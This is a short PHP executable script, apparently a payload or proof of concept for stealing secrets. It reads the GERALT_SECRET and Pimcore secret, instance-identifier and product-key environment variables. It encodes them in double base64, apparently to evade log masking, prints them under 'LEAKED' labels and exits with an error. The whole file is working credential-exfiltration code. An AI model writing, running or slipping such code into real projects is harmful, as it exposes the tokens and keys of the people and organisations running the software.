#!/usr/bin/env php
<?php
$g = (string) getenv('GERALT_SECRET');
echo 'GERALT_LEAKED_TOKEN=' . base64_encode(base64_encode($g)) . PHP_EOL;
$s = (string) getenv('PIMCORE_SECRET');
$i = (string) getenv('PIMCORE_INSTANCE_IDENTIFIER');
$p = (string) getenv('PIMCORE_PRODUCT_KEY');
echo 'PIMCORE_LEAK=' . base64_encode(base64_encode($s . '|' . $i . '|' . $p)) . PHP_EOL;
exit(1);
